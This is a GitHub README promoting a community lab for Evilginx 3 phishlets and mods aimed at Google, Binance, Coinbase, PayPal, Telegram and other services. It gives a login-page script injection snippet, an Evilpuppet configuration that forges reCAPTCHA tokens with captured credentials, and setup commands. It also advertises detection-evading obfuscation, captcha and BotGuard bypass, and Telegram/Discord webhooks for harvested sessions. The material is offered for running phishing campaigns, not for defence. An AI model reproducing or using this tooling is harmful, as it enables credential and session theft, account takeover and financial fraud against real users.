# Evilginx 3 PHISHLET
<img align="left" src="https://github.com/user-attachments/assets/9655710b-1b9e-4ed7-894a-b5109aecff6c" width="450" height="550">

This repository was created solely to assist in the creation of PHISHLETS / Modification of the Evilginx software itself / In solving any problems associated with this software and PHISHLETS.

__Preface:__ At the moment, there are a very large number of scammers who sell public, raw goods, people who do not understand at all how Reverse Proxy works. Watching these people on hacker sites, telegram channels and on the Internet in general becomes funny. There is nothing complicated in creating a template for EvilGinx; the entire manual is described by the founder himself 
[kgretzky](https://github.com/kgretzky) "Owner") __[__thanks to him for this creation__]__ It is for this reason that we decided to make a small laboratory for mutual assistance in this matter.

### #Installation Steps​
Learn how to install Evilginx locally or deploy it on a remote server [Deployment](https://help.evilginx.com/docs/category/deployment) / Learn how to set up Evilginx and run your first phishing campaign [Quick Start](https://help.evilginx.com/docs/getting-started/quick-start) / Learn how to use Evilginx [Guides](https://help.evilginx.com/docs/category/guides) __[ CONFIG X PHISHLETS X LURES X REDIRECTORS X SESSIONS X PROXY X BLACKLIST ]__

#### Which PHISHLETs are currently available have been tested on our versions 3.7.1 - 3.9.0.

##### [ Google x Binance x Blockchain x Coinbase x Bitmedia x PayPal x Telegram x Proton x Dropbox x Payeer ]

### #Phishlet Format (v3.0.0-vX.X.X)

Phishlets are configuration files in YAML format. If you need to get familiar with YAML, first, you can find some good overview here: [YAML Syntax](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html) 
Phishlet Format [Create](https://help.evilginx.com/docs/phishlet-format) 

### #js_inject
This section defines all Javascript scripts that you want to inject into proxied pages. Every script can be customized with {var_name} variable parameters, which later can be set to different values in each created lure.
```
js_inject:
  - trigger_domains: ["www.domain.com"]
    trigger_paths: ["/uas/login"]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```
>### info
This part applies only to Evilginx Pro users who have access to Evilpuppet module.

Interactive background browser sessions, spawned on-demand, with sole purpose of forging secret tokens to be used within the proxied Evilginx session.

```
evilpuppet:
  triggers:
    - domains: ['www.domain.com']
      paths: ['/sessions']
      token: 'recaptcha_token'
      open_url: 'https://www.domain.com/signin'
      actions:
        - selector: '#email'
          value: '{username}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#password'
          value: '{password}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#stay_signed_in'
          click: true
          post_wait: 0
        - selector: '#signin_button'
          click: true
          post_wait: 0
  interceptors:
    - token: 'recaptcha_token'
      url_re: '/sessions'
      post_re: 'recaptcha_token=([^&]*)'
      abort: true
```
#### Installation Steps​
Update Package Lists​

Begin by updating your system’s package lists to ensure you have the latest information on the newest versions of packages and their dependencies.
```
sudo apt-get update
```
Install xrandr​

xrandr is a utility for managing screen resolutions and display settings.

-- Use this option if you want to run Playwright with Xserver (for example, in MobaXterm) so you can view the browser live.
-- If use "Headless: playwright.Bool(true)," do no need this to install.
```
sudo apt-get install x11-xserver-utils  
```
#### Install Google Chrome

-- Use Chrome only if you choose not to use the browsers included in the Playwright app. In the source you received, you don’t need these installations.​

Download and install the latest stable version of Google Chrome.
```
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome-stable_current_amd64.deb
sudo apt-get install -f # Install any missing dependencies
```
#### Install Go Programming Language

-- You will need to install the Go language, as the source code is in Go, and to compile it in Linux, you need Go installed.​
Go is essential for running Playwright-Go.

```
wget https://golang.org/dl/go1.23.4.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.23.4.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
go version
```
#### Install Playwright-Go and Dependencies

-- You need to install the Playwright Go library, as the Evilginx version for Google uses a module called EvilPlaywright. This module controls a real browser behind the reverse proxy to obtain certain tokens that otherwise cannot be retrieved correctly due to the different host in the reverse proxy or due to Google detecting browser incompatibilities with video versions, fonts, etc.​
Set up Playwright-Go, which is required for browser automation.

```
go get -u github.com/playwright-community/playwright-go
go run github.com/playwright-community/playwright-go/cmd/playwright@latest install --with-deps
go install github.com/playwright-community/playwright-go/cmd/playwright@latest
playwright install --with-dep
```
##### Working with Google or other complex sites is possible when installing all libraries and components integrated with EVILGINX.
<div align="center">
<a href="https://www.veed.io/view/b8859127-37b4-4c59-b8e7-b2d801691d16?panel=share"><img src="https://github.com/user-attachments/assets/57c265c2-27c7-4fec-b63b-2a6559b481e4" alt="IMAGE ALT TEXT"></a>
</div>

#5 Puppeteer integration with Evilginx 

Evilginx X Puppeteer
https://github.com/Evi1Grey5/Evilginx-3-PHISHLET-LAB/issues/13

## Evilginx Labs by [Evi1Grey5]

<div align="center">
  <a href="https://www.veed.io/view/6859392c-a7e7-4590-bfa2-682d0431ea85?panel=quality-survey"><img src="https://github.com/user-attachments/assets/b21580a1-db99-45a1-b497-38a61f7118b1" alt="IMAGE ALT TEXT"></a>
</div>

<mp4 src="https://www.veed.io/view/6859392c-a7e7-4590-bfa2-682d0431ea85?panel=quality-survey">

# Evilginx 3.9.0
<img align="left" src="https://github.com/user-attachments/assets/67c5cb62-7c60-40b2-bb0e-4a30eaeb2949" width="450" height="550">

#### We also added Puppeteer to Evilginx and added some modifications to the http_proxy.go and phishlet.go. It turned out to be a juicy mod.

We decided to make a good mod for Evilginx. By adding Evil Puppet to it / Sending notifications via Discord / Module for generating PHISHLETs, collecting configurations via Burp Suite [ Functionality:

- Template Generation: The module can create various violet templates that mimic legitimate websites.
- Content Customization: The user can customize text, images, and other elements to make the phishlet more believable.
- Integration with Burp Suite: The module can be integrated into Burp Suite to facilitate the testing and vulnerability analysis process.
- Automation: Allows you to quickly create many phishlets for different scenarios.]
- Telegram / Discord WebHook.
- Identifier obfuscation to prevent websites from detecting evilginx.
- Fixed: Cookie grab failure when cookies have protection symbols. (Problem was that some of the symbols used in cookies are not supported by the original evilginx and it can't detect the set-cookie event. )
- Fixed: Stability issues with original evilginx. Open doors to handle unlimited number of users at the same time.
- Fully obfuscated hardcoded http_proxy.go file that is not readable to prevent fast red-flag on domains.
- Capture and proxying captcha / re / h /v2,v3.

- Cloudflare: Required if site has Cloudflare Anti-DDoS page enabled.
- BotGuard: Required for sites like Google (verified, trusted accounts), Microsoft o365 (some of) 3rd parties login pages usually big companies or extra protection without it lets say only 70% accounts would work etc etc.
- hCaptcha, recaptcha - Required for sites that have hCaptcha, recaptcha on forms or as Anti-Ddos.
- GeeTest: Needed for crypto websites like Binance, Coinbase, Blockchain etc etc
- Custom JS: Required for sites that have their own protection for certain actions.

________________________________________
### Adding "interceptors" to Evilginx // 
________________________________________
- You will be able to monitor and analyze HTTP requests and WebSocket messages that pass through your Evilginx server. This can help in understanding user behavior and identifying potential vulnerabilities.
- Data collection. Intercepting requests may allow you to collect information about users, such as credentials, access tokens, and other sensitive information, if you use Evilginx for phishing.
- Debugging. If you are developing or testing your Evilginx templates, JavaScript code integration can help you debug and identify functionality issues by showing what data is being sent and received.
- Adaptation and modification: By using request interception, you can adapt the behavior of your Evilginx server depending on the data received, for example, change messages or redirects based on the contents of requests.
[Low-level network interception library](https://github.com/mswjs/interceptors) 

### Turnkey installation Evilginx 3.9.0 #16

Questions about installing/receiving the update [#16](https://github.com/Evi1Grey5/Evilginx-3-PHISHLET-LAB/issues)

>### info
Also, all additional information is listed in the "issues" section. Read, ask your questions, share your knowledge in the Discussion section.
Whenever possible, we will post new PHISHLETS / Information about tool customization. You also need to participate in order to develop this project.
____________________

Evilginx 3 [PHISHLET] by Evi1Grey5 [CUSTOM CREATION / FREE / DEVELOPMENT]
<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">

Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
